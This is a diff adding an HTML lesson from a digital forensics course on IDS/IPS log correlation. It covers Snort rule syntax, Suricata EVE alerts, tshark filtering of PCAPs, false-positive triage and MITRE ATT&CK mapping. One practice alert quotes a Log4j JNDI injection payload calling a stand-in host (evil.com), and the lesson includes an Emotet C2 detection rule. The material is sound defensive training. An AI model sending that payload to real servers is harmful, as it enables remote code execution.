@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DF-38: IDS/IPS Log Correlation | Forensics Hub</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-dark: #090910; --bg-card: #111120; --bg-terminal: #0d1117;
+            --accent: #38bdf8; --accent-dim: rgba(56,189,248,0.12); --accent-border: rgba(56,189,248,0.25);
+            --green: #4ade80; --yellow: #fbbf24; --red: #f87171;
+            --text-primary: #e2e8f0; --text-secondary: #8b949e; --border: rgba(255,255,255,0.08);
+        }
+        body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; }
+        .fh-header { background: var(--bg-card); border-bottom: 1px solid var(--border); padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .fh-header-left { display: flex; align-items: center; gap: 14px; }
+        .fh-badge { background: var(--accent); color: #fff; padding: 4px 10px; border-radius: 4px; font-size: 0.72rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.5px; }
+        .fh-header h1 { font-size: 1.05rem; font-weight: 600; color: var(--accent); }
+        .fh-back { color: var(--text-secondary); padding: 6px 14px; border: 1px solid var(--border); border-radius: 6px; font-size: 0.85rem; transition: all 0.2s; text-decoration: none; }
+        .fh-back:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .fh-breadcrumb { padding: 9px 24px; font-size: 12px; color: var(--text-secondary); background: rgba(9,9,16,0.6); border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .fh-breadcrumb a { color: var(--accent); text-decoration: none; }
+        .fh-breadcrumb a:hover { opacity: 0.8; }
+        .fh-breadcrumb-sep { margin: 0 7px; color: #333; }
+        .content-panel { max-width: 820px; margin: 0 auto; padding: 30px 32px 60px; }
+        .section { margin-bottom: 36px; }
+        .section-title { font-size: 1.25rem; color: var(--accent); margin-bottom: 14px; display: flex; align-items: center; gap: 10px; }
+        .section-title::before { content: ''; width: 3px; height: 20px; background: var(--accent); border-radius: 2px; flex-shrink: 0; }
+        .objectives { background: var(--accent-dim); border-left: 3px solid var(--accent); padding: 16px 20px; border-radius: 0 8px 8px 0; margin-bottom: 28px; }
+        .objectives h2 { color: var(--accent); margin-bottom: 10px; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .objectives ul { list-style: none; }
+        .objectives li { padding: 4px 0 4px 20px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .objectives li::before { content: '>'; position: absolute; left: 0; color: var(--accent); font-family: 'JetBrains Mono', monospace; }
+        .content-text { color: var(--text-secondary); margin-bottom: 14px; font-size: 0.95rem; line-height: 1.7; }
+        .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
+        .feature-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+        .feature-card strong { color: var(--accent); display: block; margin-bottom: 4px; font-size: 0.88rem; }
+        .feature-card span { color: var(--text-secondary); font-size: 0.84rem; line-height: 1.5; }
+        .code-block { background: var(--bg-terminal); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin: 14px 0; overflow-x: auto; }
+        .code-block-header { font-size: 0.72rem; color: var(--text-secondary); margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px; }
+        .code-block-header::before { content: ''; width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+        .code-block pre { font-family: 'JetBrains Mono', monospace; font-size: 0.83rem; line-height: 1.75; color: var(--text-primary); }
+        .cm { color: #6a737d; } .num { color: #79c0ff; } .out { color: var(--green); } .hl { color: var(--yellow); }
+        .callout { border-radius: 8px; padding: 16px 20px; margin: 20px 0; }
+        .callout--info { background: var(--accent-dim); border: 1px solid var(--accent-border); }
+        .callout--warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.25); }
+        .callout--danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.25); }
+        .callout h4 { font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .callout--info h4 { color: var(--accent); } .callout--warn h4 { color: var(--yellow); } .callout--danger h4 { color: var(--red); }
+        .callout p, .callout li { font-size: 0.88rem; color: var(--text-secondary); line-height: 1.6; }
+        .callout ul { list-style: none; }
+        .callout ul li { padding-left: 16px; position: relative; margin-bottom: 4px; }
+        .callout ul li::before { content: '-'; position: absolute; left: 0; color: var(--accent); }
+        .evidence-table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 0.87rem; }
+        .evidence-table th { background: rgba(56,189,248,0.08); color: var(--accent); font-weight: 600; text-align: left; padding: 10px 14px; border-bottom: 2px solid rgba(56,189,248,0.2); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .evidence-table td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: var(--text-secondary); vertical-align: top; }
+        .evidence-table tr:hover td { background: rgba(56,189,248,0.04); }
+        .inline-code { background: var(--bg-terminal); padding: 2px 6px; border-radius: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.83em; color: var(--accent); }
+        .try-it { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.2); border-radius: 8px; padding: 18px 20px; margin: 20px 0; }
+        .try-it h3 { color: var(--green); margin-bottom: 10px; font-size: 0.95rem; }
+        .try-it p, .try-it li { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 6px; }
+        .try-it ol { padding-left: 20px; }
+        .takeaways { background: linear-gradient(135deg, rgba(56,189,248,0.08), rgba(56,189,248,0.04)); border: 1px solid var(--accent); border-radius: 8px; padding: 20px; margin: 25px 0; }
+        .takeaways h3 { color: var(--accent); margin-bottom: 12px; font-size: 1rem; }
+        .takeaways ul { list-style: none; }
+        .takeaways li { padding: 5px 0 5px 24px; position: relative; color: var(--text-secondary); font-size: 0.9rem; }
+        .takeaways li::before { content: '\2713'; position: absolute; left: 0; color: var(--green); font-weight: bold; }
+        .nav-footer { display: flex; justify-content: space-between; padding: 16px 0; margin-top: 30px; border-top: 1px solid var(--border); }
+        .nav-btn { display: flex; align-items: center; gap: 8px; padding: 10px 16px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; color: var(--text-primary); text-decoration: none; font-size: 0.9rem; transition: all 0.2s; }
+        .nav-btn:hover { border-color: var(--accent); background: var(--accent-dim); }
+        .nav-btn.primary { background: var(--accent); color: #fff; border-color: var(--accent); }
+        .nav-btn.primary:hover { filter: brightness(1.1); }
+        @media (max-width: 700px) { .content-panel { padding: 20px 16px 40px; } .feature-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <header class="fh-header">
+        <div class="fh-header-left">
+            <span class="fh-badge">DF-38</span>
+            <h1>IDS/IPS Log Correlation</h1>
+        </div>
+        <a href="../../index.html" class="fh-back">&lt; Forensics Hub</a>
+    </header>
+    <nav class="fh-breadcrumb" aria-label="Breadcrumb">
+        <a href="/dashboard.html">Dashboard</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Forensics Hub</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        <a href="../../index.html">Network Forensics</a>
+        <span class="fh-breadcrumb-sep">/</span>
+        DF-38: IDS/IPS Log Correlation
+    </nav>
+
+    <div class="content-panel">
+        <div class="objectives">
+            <h2>Learning Objectives</h2>
+            <ul>
+                <li>Parse Snort rule syntax to understand what each rule detects</li>
+                <li>Read and interpret Suricata EVE JSON alert format</li>
+                <li>Correlate IDS alerts with PCAP evidence for validation</li>
+                <li>Identify and document false positives vs true positives</li>
+                <li>Map IDS alerts to MITRE ATT&CK techniques</li>
+            </ul>
+        </div>
+
+        <section class="section">
+            <h2 class="section-title">Snort Rule Anatomy</h2>
+            <p class="content-text">Understanding Snort rules is essential for interpreting IDS alerts. Every rule has two parts: the header (action, protocol, source, destination) and the options (detection logic).</p>
+
+            <div class="code-block">
+                <div class="code-block-header">Snort Rule Structure</div>
+                <pre><span class="cm"># Rule format: action protocol src_ip src_port -> dst_ip dst_port (options)</span>
+
+<span class="hl">alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (</span>
+<span class="hl">    msg:"ET MALWARE Win32/Emotet CnC Activity (POST)";</span>
+<span class="hl">    flow:established,to_server;</span>
+<span class="hl">    content:"POST"; http_method;</span>
+<span class="hl">    content:"/wp-content/uploads/"; http_uri;</span>
+<span class="hl">    content:"Cookie:"; http_header;</span>
+<span class="hl">    pcre:"/Cookie:\s[a-f0-9]{16,}/Hi";</span>
+<span class="hl">    reference:url,abuse.ch;</span>
+<span class="hl">    classtype:trojan-activity;</span>
+<span class="hl">    sid:2028401; rev:3;</span>
+<span class="hl">)</span>
+
+<span class="cm"># Breaking it down:</span>
+<span class="out">alert         -- generate an alert (vs drop, pass, reject)</span>
+<span class="out">tcp           -- protocol</span>
+<span class="out">$HOME_NET     -- source: internal network</span>
+<span class="out">$EXTERNAL_NET -- destination: external network</span>
+<span class="out">msg:          -- alert message text</span>
+<span class="out">flow:         -- connection state (established, to_server)</span>
+<span class="out">content:      -- byte pattern to match</span>
+<span class="out">http_method:  -- match in HTTP method field specifically</span>
+<span class="out">pcre:         -- Perl-compatible regex for complex patterns</span>
+<span class="out">sid:          -- Signature ID (unique rule identifier)</span>
+<span class="out">rev:          -- Rule revision number</span></pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Suricata EVE JSON Format</h2>
+            <p class="content-text">Suricata's EVE (Extensible Event Format) outputs alerts as structured JSON, making it ideal for SIEM ingestion and automated analysis.</p>
+
+            <div class="code-block">
+                <div class="code-block-header">Suricata EVE Alert Example</div>
+                <pre>{
+  "timestamp": "2024-03-15T14:47:00.123456+0000",
+  "flow_id": 1234567890,
+  "event_type": "alert",
+  "src_ip": "10.0.0.50",
+  "src_port": 49301,
+  "dest_ip": "185.234.52.18",
+  "dest_port": 443,
+  "proto": "TCP",
+  "alert": {
+    <span class="hl">"action": "allowed",</span>
+    <span class="hl">"gid": 1,</span>
+    <span class="hl">"signature_id": 2028401,</span>
+    <span class="hl">"rev": 3,</span>
+    <span class="hl">"signature": "ET MALWARE Win32/Emotet CnC Activity (POST)",</span>
+    <span class="hl">"category": "A Network Trojan was Detected",</span>
+    <span class="hl">"severity": 1</span>
+  },
+  "http": {
+    "hostname": "185.234.52.18",
+    "http_method": "POST",
+    "url": "/wp-content/uploads/",
+    "http_user_agent": "Mozilla/4.0",
+    "status": 200,
+    "length": 4218
+  },
+  "tls": {},
+  "app_proto": "http"
+}</pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Alert Correlation with PCAP</h2>
+            <p class="content-text">An IDS alert tells you something triggered a rule. The PCAP tells you exactly what happened. Correlation validates the alert and provides context.</p>
+
+            <div class="code-block">
+                <div class="code-block-header">Correlation Workflow</div>
+                <pre><span class="cm"># Step 1: Get the alert details</span>
+<span class="out">SID: 2028401  Time: 14:47:00  Src: 10.0.0.50  Dst: 185.234.52.18:443</span>
+
+<span class="cm"># Step 2: Filter PCAP for the specific flow</span>
+$ tshark -r evidence.pcap -Y "ip.addr == 10.0.0.50 and ip.addr == 185.234.52.18" \
+    -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e http.request.method
+
+<span class="cm"># Step 3: Examine the matching HTTP POST</span>
+$ tshark -r evidence.pcap \
+    -Y "ip.src == 10.0.0.50 and ip.dst == 185.234.52.18 and http.request.method == POST" \
+    -V | head -60
+
+<span class="cm"># Step 4: Verify the rule matched correctly</span>
+<span class="cm"># Check: is the URI /wp-content/uploads/?</span>
+<span class="cm"># Check: does the Cookie header match the hex pattern?</span>
+<span class="cm"># Check: is this truly Emotet C2 or a legitimate WordPress upload?</span>
+
+<span class="cm"># Step 5: Document the correlation</span>
+<span class="out">Alert SID 2028401 CONFIRMED as TRUE POSITIVE</span>
+<span class="out">Emotet C2 POST to 185.234.52.18 at 14:47:00</span>
+<span class="out">Cookie header contains 32-char hex string (session token)</span>
+<span class="out">Response: HTTP 200 with 4218 bytes (command payload)</span></pre>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">False Positive Identification</h2>
+
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <strong>Overly Broad Rules</strong>
+                    <span>Rules matching common patterns (e.g., "content: GET") will fire on legitimate traffic. Check if the rule is too generic for your environment.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>Legitimate Application Behavior</strong>
+                    <span>Software updates, cloud services, and CDNs can trigger rules designed for malware. Verify the destination is actually malicious.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>Context Mismatch</strong>
+                    <span>A rule for "SQL injection" triggering on a legitimate database backup transfer. The payload matches the pattern but the context is benign.</span>
+                </div>
+                <div class="feature-card">
+                    <strong>Stale Rules</strong>
+                    <span>Old rules for patched vulnerabilities or decommissioned IOCs. Check the rule revision date and whether the threat is still relevant.</span>
+                </div>
+            </div>
+
+            <div class="callout callout--warn">
+                <h4>Documenting False Positives</h4>
+                <p>When you determine an alert is a false positive, document: the SID, why it is a false positive, the legitimate traffic that triggered it, and the recommended tuning action (threshold, suppress, or modify). This prevents future analysts from re-investigating the same false alarm.</p>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">MITRE ATT&CK Mapping</h2>
+            <p class="content-text">Mapping IDS alerts to MITRE ATT&CK techniques provides standardized context for the investigation team.</p>
+
+            <table class="evidence-table">
+                <thead>
+                    <tr>
+                        <th>Alert Category</th>
+                        <th>Example SID</th>
+                        <th>ATT&CK Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Trojan C2 Activity</td>
+                        <td>2028401 (Emotet POST)</td>
+                        <td>T1071.001 - Application Layer Protocol: Web</td>
+                    </tr>
+                    <tr>
+                        <td>DNS Tunneling</td>
+                        <td>2027863 (DNS TXT tunnel)</td>
+                        <td>T1071.004 - Application Layer Protocol: DNS</td>
+                    </tr>
+                    <tr>
+                        <td>Exploit Attempt</td>
+                        <td>2024897 (Log4j RCE)</td>
+                        <td>T1190 - Exploit Public-Facing Application</td>
+                    </tr>
+                    <tr>
+                        <td>Lateral Movement SMB</td>
+                        <td>2025650 (PsExec SMB)</td>
+                        <td>T1021.002 - Remote Services: SMB</td>
+                    </tr>
+                    <tr>
+                        <td>Data Exfiltration</td>
+                        <td>2019284 (Large Upload)</td>
+                        <td>T1048 - Exfiltration Over Alternative Protocol</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section class="section">
+            <div class="try-it">
+                <h3>Practice: Correlate Alerts with PCAP Evidence</h3>
+                <p>Given these Suricata alerts, determine which are true positives and which are likely false positives:</p>
+                <div class="code-block">
+                    <pre>Alert 1: SID:2024897 "ET EXPLOIT Apache Log4j RCE (CVE-2021-44228)"
+  Src: 203.0.113.50:44821 -> Dst: 10.0.0.100:8080
+  Payload: "${jndi:ldap://evil.com/exploit}"
+
+Alert 2: SID:2013028 "ET POLICY curl User-Agent Outbound"
+  Src: 10.0.0.25:49200 -> Dst: api.github.com:443
+  User-Agent: "curl/7.88.1"
+
+Alert 3: SID:2028401 "ET MALWARE Emotet CnC Activity (POST)"
+  Src: 10.0.0.50:49301 -> Dst: 185.234.52.18:8080
+  URI: /wp-content/uploads/
+  Cookie: a4f8d2e1b4c596fb92427831e2f0a4c1</pre>
+                </div>
+                <ol>
+                    <li>Classify each alert as true positive, false positive, or needs investigation.</li>
+                    <li>For each true positive, map to MITRE ATT&CK.</li>
+                    <li>What PCAP analysis would you perform to validate Alert 1?</li>
+                </ol>
+                <p><strong style="color:var(--green)">Analysis:</strong></p>
+                <p>1. Alert 1: TRUE POSITIVE -- Log4j JNDI injection payload targeting an internal web server. Alert 2: Likely FALSE POSITIVE -- curl to GitHub API is common for DevOps automation, but investigate if 10.0.0.25 is a development server. Alert 3: TRUE POSITIVE -- matches Emotet C2 pattern with hex cookie to suspicious IP on port 8080.</p>
+                <p>2. Alert 1: T1190 (Exploit Public-Facing Application). Alert 3: T1071.001 (Web C2).</p>
+                <p>3. For Alert 1: extract the full HTTP request from PCAP, check if the JNDI payload reached the application, check for a subsequent connection from 10.0.0.100 to evil.com (indicating successful exploitation), and check for follow-on activity from 10.0.0.100.</p>
+            </div>
+        </section>
+
+        <div class="takeaways">
+            <h3>Key Takeaways</h3>
+            <ul>
+                <li>Snort rules have two parts: header (who/what) and options (how to detect)</li>
+                <li>Suricata EVE JSON provides structured alert data ideal for SIEM and automation</li>
+                <li>Always correlate IDS alerts with PCAP to validate true vs false positives</li>
+                <li>False positive documentation prevents wasted effort and enables rule tuning</li>
+                <li>MITRE ATT&CK mapping standardizes alert context across the investigation team</li>
+                <li>SID lookup on Emerging Threats or Snort.org provides rule context and references</li>
+            </ul>
+        </div>
+
+        <div class="nav-footer">
+            <a href="df-37-pcap-extraction.module.html" class="nav-btn">&larr; Prev: PCAP Extraction</a>
+            <a href="df-39-wireless.module.html" class="nav-btn primary">Next: Wireless Forensics &rarr;</a>
+        </div>
+    </div>
+
+    <script>
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.init({ moduleId: 'df-38', hubKey: 'hexworth_forensics_progress' });
+        }
+    </script>
+</body>
+</html>
